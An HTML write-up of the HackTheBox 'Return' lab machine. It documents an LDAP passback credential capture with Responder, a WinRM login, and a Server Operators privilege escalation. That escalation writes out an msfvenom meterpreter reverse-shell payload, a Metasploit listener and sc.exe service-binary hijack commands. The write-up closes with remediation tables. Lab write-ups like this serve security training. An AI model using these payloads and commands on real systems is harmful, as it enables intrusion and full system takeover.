@@ -1,0 +1,611 @@
+<title>HackTheBox - Return (Easy)</title>
+<header>
+    <div class="header">
+        <img class="headerImage" src="https://www.notion.so/images/page-cover/gradients_10.jpg"/>
+        <img class="headerIcon" src="https://labs.hackthebox.com/storage/avatars/defa149ea7e259a4709a03a5825e970d.png"/>
+        <h1 class="mainTitle">HackTheBox - Return (Easy)</h1>
+    </div>
+</header>
+<div class="writeUp">
+    <p class="boxLink">
+        <a href="https://app.hackthebox.com/machines/401">https://app.hackthebox.com/machines/401</a>
+    </p>
+    <h1 id="table-of-contents">Table of contents</h1>
+    <nav>
+        <div>
+            <a href="#table-of-contents">Table of contents</a>
+        </div>
+        <div>
+            <a href="#enumeration">Enumeration</a>
+        </div>
+        <div>
+            <a class="t2" href="#nmap-scan">Nmap scan</a>
+        </div>
+        <div>
+            <a class="t2" href="#web-enumeration">Web enumeration (port 80)</a>
+        </div>
+        <div>
+            <a href="#initial-access">Initial access</a>
+        </div>
+        <div>
+            <a href="#post-exploitation">Post-exploitation</a>
+        </div>
+        <div>
+            <a class="t2" href="#local-enumeration">Local enumeration</a>
+        </div>
+        <div>
+            <a class="t2" href="#privilege-escalation">Privilege escalation</a>
+        </div>
+        <div>
+            <a href="#vulnerabilities-summary">Vulnerabilities summary</a>
+        </div>
+        <div>
+            <a class="t2" href="#missing-access-control">Missing access control</a>
+        </div>
+        <div>
+            <a class="t2" href="#insecure-authentication-protocol">Insecure authentication protocol</a>
+        </div>
+        <div>
+            <a class="t2" href="#local-user-account-misconfiguration">Local user account misconfiguration (svc-printer)</a>
+        </div>
+        <div>
+            <a href="#sources">Sources</a>
+        </div>
+    </nav>
+    
+    <h1 id="enumeration">Enumeration</h1>
+    <h2 id="nmap-scan">Nmap scan</h2>
+    <pre class="code">
+			<code>
+# Nmap 7.93 scan initiated Mon May 15 07:32:45 2023 as: nmap -A -p- -oN nmapResults.txt 10.129.95.241
+Nmap scan report for 10.129.95.241
+Host is up (0.058s latency).
+Not shown: 65509 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: HTB Printer Admin Panel
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-15 11:51:51Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49680/tcp open  msrpc         Microsoft Windows RPC
+49688/tcp open  msrpc         Microsoft Windows RPC
+49697/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+|_clock-skew: 18m34s
+| smb2-time: 
+|   date: 2023-05-15T11:52:51
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon May 15 07:34:22 2023 -- 1 IP address (1 host up) scanned in 97.31 seconds</code>
+		</pre>
+		
+		<h2 id="web-enumeration">Web enumeration (port 80)</h2>
+		<p>Let’s see what’s on the webserver on port 80 : </p>
+        <img src="index.png">
+        <p>So, we have access to a printer admin panel. The first problem I see here is the fact that there is <strong class="highlight-red">no access control</strong> on this admin panel. The impact of this will depend on what we are able to do on this admin panel.</p>
+        <p>Let’s see what’s on the <strong class="highlight-default">Settings</strong> page : </p>
+        <img src="settings.png"/>
+        <p>
+            We can see the configuration of the printer. Fortunately for the target (not for an attacker), the password is not returned in the password field, this is a good point. We can see the server port set to <strong class="highlight-red">389</strong>. 
+            According to this information, the printer will try to authenticate using the LDAP protocol and not the LDAPS protocol. The problem with LDAP is that the communication is not encrypted, so the credentials will be sent in clear text and may be captured by an attacker. 
+            We also found a username that could be useful later (<strong class="highlight-red">svc-printer</strong>).
+        </p>
+        <h1>Initial access</h1>
+        <p>Since we are able to edit the server address, we may be able to capture the credentials from the LDAP request by usnig <a href="https://github.com/SpiderLabs/Responder">Responder</a> 
+            and setting the server address to the IP address of our attacking host. First, let’s start responder on the VPN interface : 
+        </p>
+        <pre class="code">
+            <code>
+┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Return]
+└─$ sudo responder -I tun0
+[sudo] password for kali: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -&gt; https://www.patreon.com/PythonResponder
+  Paypal  -&gt; https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.16.8]
+    Responder IPv6             [dead:beef:4::1006]
+    Challenge set              [random]
+    Don&#x27;t Respond To Names     [&#x27;ISATAP&#x27;]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-8IV3QBR5OTW]
+    Responder Domain Name      [UCI7.LOCAL]
+    Responder DCE-RPC Port     [45552]
+
+[+] Listening for events...</code></pre>
+    <p>Now, we can set the server address to our IP address on the printer admin panel : </p>
+    <img src="exploit.png"/>
+    <p>Then we can click on the <strong>Update</strong> button. Finally, let’s see if <a href="https://github.com/SpiderLabs/Responder">Responder</a> captured the LDAP authentication request : </p>
+    <pre class="code">
+    <code>[LDAP] Cleartext Client   : 10.129.95.241
+[LDAP] Cleartext Username : return\svc-printer
+[LDAP] Cleartext Password : [HIDDEN]</code></pre>
+    <p>We successfully captured the clear-text password for the <code><strong>svc-printer</strong></code> user. Since port <code><strong>5985</strong></code> 
+        is open (it is the <a href="https://en.wikipedia.org/wiki/Windows_Remote_Management">WinRM</a> service), we can try to connect to it with those credentials using <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a> : 
+    </p>
+    <pre class="code"><code>┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.129.95.241 -u svc-printer -p &#x27;[HIDDEN]&#x27;
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                   
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt;</code></pre>
+    <p>We successfully gained an initial access on the target system via the <a href="https://en.wikipedia.org/wiki/Windows_Remote_Management">WinRM</a> service. 
+        Why do user account <strong class="useful-information">svc-printer</strong> has access to the <a href="https://en.wikipedia.org/wiki/Windows_Remote_Management">WinRM</a> service ? 
+        This may be considered as a vulnerability since it gives more privileges to this account than it needs.
+    </p>
+    <h1 id="post-exploitation">Post-exploitation</h1>
+    <h2 id="local-enumeration">Local enumeration</h1>
+    <p>Let’s see what privileges does <strong>svc-printer</strong> have : </p>
+    <pre class="code"><code>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; whoami /all
+                                                                                                                              
+USER INFORMATION                                                                                                              
+----------------                                                                                                              
+                                                                                                                              
+User Name          SID                                                                                                        
+================== =============================================                                                              
+return\svc-printer S-1-5-21-3750359090-2939318659-876128439-1103                                                              
+                                                                                                                              
+                                                                                                                              
+GROUP INFORMATION                                                                                                             
+-----------------                                                                                                             
+                                                                                                                              
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                         State
+============================= =================================== =======
+SeMachineAccountPrivilege     Add workstations to domain          Enabled
+SeLoadDriverPrivilege         Load and unload device drivers      Enabled
+SeSystemtimePrivilege         Change the system time              Enabled
+SeBackupPrivilege             Back up files and directories       Enabled
+SeRestorePrivilege            Restore files and directories       Enabled
+SeShutdownPrivilege           Shut down the system                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
+SeTimeZonePrivilege           Change the time zone                Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.</code></pre>
+    <p>You can notice that <strong>svc-printer</strong> user is a member of the <strong>Server Operators</strong> group. According to the <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators">Security Groups Microsoft documentation</a> : 
+    </p>
+    <blockquote>Members of the <strong>Server Operators</strong> group can <strong class="highlight-red">administer domain controllers</strong>. 
+        This group exists only on domain controllers. By default, the group has no members. Members of the <strong>Server Operators</strong> group can take the following actions: sign in to a server interactively, create and delete network shared resources, 
+        <strong class="highlight-red">start and stop services</strong>, back up and restore files, format the hard disk drive of the computer, and shut down the computer. 
+        This group can&#x27;t be renamed, deleted, or removed.
+    </blockquote>
+    <p>Since we are able to start and stop services, we can try to change the binary path of a service to make it execute a malicious executable. 
+        Let’s see what services are running on the system : 
+    </p>
+    <pre class="code"><code>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; services
+
+Path                                                                                                                 Privileges Service          
+----                                                                                                                 ---------- -------          
+C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
+\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
+C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
+&quot;C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe&quot;                                                False Sense            
+C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
+&quot;C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe&quot;                                                     True VGAuthService    
+&quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot;                                                                        True VMTools          
+&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe&quot;                                             True WdNisSvc         
+&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe&quot;                                            True WinDefend        
+&quot;C:\Program Files\Windows Media Player\wmpnetwk.exe&quot;                                                                      False WMPNetworkSvc</code></pre>
+    <p>We can use <strong class="highlight-red">sc.exe</strong> to list the permissions on services. We can try with the <strong>VMTools</strong> service : </p>
+    <pre class="code"><code>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; sc.exe sdshow VMTools
+
+D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)</code></pre>
+    <p>The output is in <strong>SDDL (Security Descriptor Definition Language)</strong> format. <a href="https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/">Here</a> 
+        is a documentation to understand the syntax of this output. According to this documentation, the <strong class="highlight-default">Server Operators</strong> group has the following privileges on the <strong>VMTools</strong> service : 
+    </p>
+    <ul>
+        <li style="list-style-type:disc">CC : Create All Child Objects</li>
+    </ul>
+    <ul>
+        <li style="list-style-type:disc">DC : Delete All Child Objects</li>
+    </ul>
+    <ul>
+        <li style="list-style-type:disc">LC : List Contents</li>
+    </ul>
+    <ul>
+        <li style="list-style-type:disc">SW : All Validated Writes</li>
+    </ul>
+    <ul>
+        <li style="list-style-type:disc">RP : Read All Properties</li>
+    </ul>
+    <ul>
+        <li style="list-style-type:disc"><strong class="highlight-red">WP : Write All Properties</strong></li>
+    </ul>
+    <ul>
+        <li style="list-style-type:disc">DT : Delete Subtree</li>
+    </ul>
+    <ul>
+        <li style="list-style-type:disc">LO : List Object</li>
+    </ul>
+    <ul>
+        <li style="list-style-type:disc">CR : All Extended Rights</li>
+    </ul>
+    <ul>
+        <li style="list-style-type:disc">SD : Delete</li>
+    </ul>
+    <ul>
+        <li style="list-style-type:disc">RC : Read Permissions</li>
+    </ul>
+    <ul>
+        <li style="list-style-type:disc">WD : Modify Permissions</li>
+    </ul>
+    <ul>
+        <li style="list-style-type:disc">WO : Modify Owner</li>
+    </ul>
+    <p>So we can change any properties of the <strong>VMTools</strong> service. We know that this service runs the 
+        <strong>vmtoolsd</strong> process. We can see if this process is running as <strong class="highlight-red">NT AUTHORITY\SYSTEM</strong>. To do this, we can use the following command :
+    </p>
+    <pre class="code"><code>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; sc.exe qc VMTools
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: VMTools
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : &quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot;
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : VMware Tools
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem</code></pre>
+    <p><strong>VMTools</strong> service runs as <strong class="highlight-red">LocalSystem</strong>. According to <strong><a href="https://learn.microsoft.com/fr-fr/windows/win32/services/localsystem-account?redirectedfrom=MSDN">this</strong></a> documentation : 
+    </p>
+    <blockquote>The <strong>LocalSystem</strong> account is a predefined local account used by the service control manager. This account is not recognized by the security subsystem, so you cannot specify its name in a 
+        call to the <a href="https://learn.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-lookupaccountnamea"><strong>LookupAccountName</strong></a> function. It has extensive privileges on the local computer, 
+        and acts as the computer on the network. Its token includes the <strong class="highlight-red">NT AUTHORITY\SYSTEM and BUILTIN\Administrators SIDs</strong>
+    </blockquote>
+    <p>If we get a shell as this user, we may gain administrative privileges on the target system. We have everything we need to escalate our privileges.</p>
+    <h1 class="title2">Privilege escalation</h1>
+    <p>First, let’s use <strong class="highlight-red">msfvenom</strong> to generate a malicious executable that will open a meterpreter to our attacking host : </p>
+    <pre class="code"><code>┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4242 -f exe-service -o rshell.exe 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe-service file: 48640 bytes
+Saved as: rshell.exe</code></pre>
+    <p>Now, we can run <strong class="highlight-red">msfconsole</strong> and start a listener in order to receive the connexion from the meterpreter : </p>
+    <pre class="code"><code>┌──(kali㉿kali)-[~]
+└─$ msfconsole                                                                                        
+                                                  
+                          ########                  #
+                      #################            #
+                   ######################         #
+                  #########################      #
+                ############################
+               ##############################
+               ###############################
+              ###############################
+              ##############################
+                              #    ########   #
+                 ##        ###        ####   ##
+                                      ###   ###
+                                    ####   ###
+               ####          ##########   ####
+               #######################   ####
+                 ####################   ####
+                  ##################  ####
+                    ############      ##
+                       ########        ###
+                      #########        #####
+                    ############      ######
+                   ########      #########
+                     #####       ########
+                       ###       #########
+                      ######    ############
+                     #######################
+                     #   #   ###  #   #   ##
+                     ########################
+                      ##     ##   ##     ##
+                            https://metasploit.com
+
+
+       =[ metasploit v6.3.4-dev                           ]
++ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
++ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Start commands with a space to avoid saving 
+them to history
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 &gt; use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set LHOST tun0
+LHOST =&gt; tun0
+msf6 exploit(multi/handler) &gt; set LPORT 4242
+LPORT =&gt; 4242
+msf6 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 10.10.16.8:4242</code></pre>
+    <p>Then, we can upload the malicious executable to the target host : </p>
+    <pre class="code"><code>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; upload /home/kali/rshell.exe
+Info: Uploading /home/kali/rshell.exe to C:\Users\svc-printer\Documents\rshell.exe
+
+                                                             
+Data: 64852 bytes of 64852 bytes copied
+
+Info: Upload successful!</code></pre>
+    <p>Next, we can change the binary path of the <strong class="highlight-default">VMTools</strong> service to the path of the malicious executable, stop the service, and start it again : </p>
+    <pre class="code"><code>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; sc.exe config VMTools binPath=&quot;C:\Users\svc-printer\Documents\rshell.exe&quot;
+[SC] ChangeServiceConfig SUCCESS
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; sc.exe stop VMTools
+
+SERVICE_NAME: VMTools
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; sc.exe start VMTools
+
+SERVICE_NAME: VMTools
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+        PID                : 2256
+        FLAGS              :</code></pre>
+        <p>Finally, let’s check our listener to see if we received a connection : </p>
+        <pre class="code"><code>[*] Started reverse TCP handler on 10.10.16.8:4242 
+[*] Sending stage (200774 bytes) to 10.129.95.241
+[*] Meterpreter session 1 opened (10.10.16.8:4242 -&gt; 10.129.95.241:52155) at 2023-05-18 19:21:52 -0400
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt;</code></pre>
+    <p>We successfully received a connection and we have a meterpreter shell as <strong class="highlight-red">NT AUTHORITY\SYSTEM</strong>, so we have full control on the target system.</p>
+    <h1 id="vulnerabilities-summary">Vulnerabilities summary</h1>
+    <h2 id="missing-access-control">Missing access control</h2>
+    <table>
+        <thead>
+            <tr>
+                <th>Field</th>
+                <th>Value</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>Affected component</td>
+                <td>Printer admin panel</td>
+            </tr>
+            <tr>
+                <td>CVSS 3.0 score</td>
+                <td><strong>7.3</strong></td>
+            </tr>
+            <tr>
+                <td>Severity</td>
+                <td><strong class="highlight-red_background">HIGH</strong></td>
+            </tr>
+            <tr>
+                <td>Attack vector</td>
+                <td><strong>Network</strong></td>
+            </tr>
+            <tr>
+                <td>Impact</td>
+                <td>Allows an attacker to access the printer admin panel without authentication and change the printer configuration. <br/><br/>
+                    This has a <strong class="highlight-orange">low</strong> impact on the <strong class="highlight-blue">confidentiality</strong>, <strong class="highlight-blue">integrity</strong>, 
+                    <strong class="highlight-blue">and availability</strong> of the affected component.
+                </td>
+            </tr>
+            <tr>
+                <td>Remediation proposition</td>
+                <td>You should set up access control on the printer admin panel to avoid unauthorized users to change the printer settings.</td>
+            </tr>
+        </tbody>
+    </table>
+    <h2 id="sources" class="title2">Insecure authentication protocol</h2>
+    <table>
+        <thead>
+            <tr>
+                <th>Field</th>
+                <th>Value</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>Affected component</td>
+                <td>Printer admin panel</td>
+            </tr>
+            <tr>
+                <td>CVSS 3.0 score</td>
+                <td><strong>7.5</strong></td>
+            </tr>
+            <tr>
+                <td>Severity</td>
+                <td><strong class="highlight-red_background">HIGH</strong></td>
+            </tr>
+            <tr>
+                <td>Attack vector</td>
+                <td><strong>Network</strong></td>
+            </tr>
+            <tr>
+                <td>Impact</td>
+                <td>Allows an attacker to access the printer admin panel without authentication and change the printer configuration. <br/><br/>
+                    This has a <strong class="highlight-red">high</strong> impact on the <strong class="highlight-blue">confidentiality</strong> of the affected component.</td>
+            </tr>
+            <tr>
+                <td>Remediation proposition</td>
+                <td>You should use LDAPS authentication instead of LDAP to avoid malicious users to capture clear-text credentials when connecting to a print server.</td>
+            </tr>
+        </tbody>
+    </table>
+    <h2 id="local-user-account-misconfiguration" class="title2">Local user account misconfiguration (svc-printer)</h2>
+    <table>
+        <thead>
+            <tr>
+                <th>Field</th>
+                <th>Value</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>Affected component</td>
+                <td>Local system</td>
+            </tr>
+            <tr>
+                <td>CVSS 3.0 score</td>
+                <td><strong>9.8</strong></td>
+            </tr>
+            <tr>
+                <td>Severity</td>
+                <td><strong class="highlight-red_background">CRITICAL</strong></td>
+            </tr>
+            <tr>
+                <td>Attack vector</td>
+                <td><strong>Network</strong></td>
+            </tr>
+            <tr>
+                <td>Impact</td>
+                <td>Allows an attacker to gain a foothold on the system via the <a href="https://en.wikipedia.org/wiki/Windows_Remote_Management">WinRM</a> 
+                    service since <strong>svc-printer</strong> is member of the <strong>Remote Management Users</strong> group. <br/><br/>Also, it allows an attacker to escalate his privileges 
+                    to the <strong>NT AUTHORITY\SYSTEM</strong> local account since <strong>svc-printer</strong> is member of the <strong>Service Operators</strong> group.<br/>
+                    <br/>This has a <strong class="highlight-red">high</strong> impact on the <strong class="highlight-blue">confidentiality</strong>, 
+                    <strong class="highlight-blue">integrity</strong>, and <strong class="highlight-blue">availability</strong> of the affected 
+                    component.
+                </td>
+            </tr>
+            <tr>
+                <td>Remediation proposition</td>
+                <td>Remove <code><strong>svc-printer</strong></code> local account from <strong>Remote Management Users</strong> and <strong>Service Operators</strong> groups 
+                    since it gives too much privileges to this user account. <br/><br/>If you really need to use those two privileges, create a different account exclusively for this 
+                    purpose.<br/>
+                </td>
+            </tr>
+        </tbody>
+    </table>
+    <h1 id="sources" class="title1">Sources</h1>
+    <ul>
+        <li>Understanding SSDL syntax : <a href="https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/">https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/</a></li>
+    </ul>
+    <ul>
+        <li>Privilege escalation with Server Operators group : <a href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/">https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/</a></li>
+    </ul>
+    <ul>
+        <li>Passback attack : <a href="https://www.wolfandco.com/resources/insights/ldap-passback-attacks-how-to-secure-your-printers/">https://www.wolfandco.com/resources/insights/ldap-passback-attacks-how-to-secure-your-printers/</a></li>
+    </ul>
+</div>
